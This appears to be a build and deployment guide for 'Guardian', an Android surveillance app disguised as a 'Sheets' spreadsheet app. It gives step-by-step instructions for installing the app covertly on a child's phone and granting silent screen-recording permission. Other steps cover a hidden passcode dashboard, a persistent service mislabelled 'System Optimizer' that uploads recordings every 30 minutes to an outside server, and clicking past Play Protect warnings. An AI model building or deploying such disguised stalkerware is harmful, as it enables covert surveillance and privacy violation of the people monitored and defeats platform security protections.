# Guardian Build & Deployment Guide (Sheets Disguise)

### Step 1: Open in Android Studio
1.  Open Android Studio.
2.  Select **"Open"** (NOT Import).
3.  Navigate to the `/android` folder in this project and click **OK**.
4.  **Important**: Because I added a `settings.gradle` file, Android Studio will now automatically recognize this as a project. You should see a loading bar at the bottom right. **Wait for it to finish.**

### Step 2: Build the APK
1.  Once the loading finishes (the project list on the left turns organized), go to the top menu: **Build** > **Build Bundle(s) / APK(s)** > **Build APK(s)**.
2.  Wait 1-2 minutes. A notification will appear in the bottom right when done.
3.  Click **"locate"** in that notification to find `app-debug.apk`. 

### Step 3: Installation & Stealth Setup
1.  Install the APK on the child's phone.
2.  It will appear as **"Sheets"** with a green icon.
3.  **Open the app**. It will ask for "Screen Recording" permission. This is **CRITICAL**. 
4.  Click **"Start Now"** (and check "Don't show again" if available). This permission allows the app to monitor activity silently.
5.  Once granted, the app returns to the "Sheets" screen.
6.  **To the child**: It looks like a normal spreadsheet app.
7.  **To you**: Type `9876` into the "Search in Sheets" bar to open your dashboard.

### Step 4: Permanent Monitoring
*   The app uses a foreground service called "System Optimizer" that runs even if the phone restarts.
*   Every 30 minutes, it sends a recording to `https://server.ironbull.io`.
*   You don't need to do anything else. Just check your server to see the logs.

### Troubleshooting
*   **No "Build APK" option?** Go to `File > Sync Project with Gradle Files`.
*   **Play Protect Block?** Click "Install anyway". We are using private code, so Google warns about it by default.
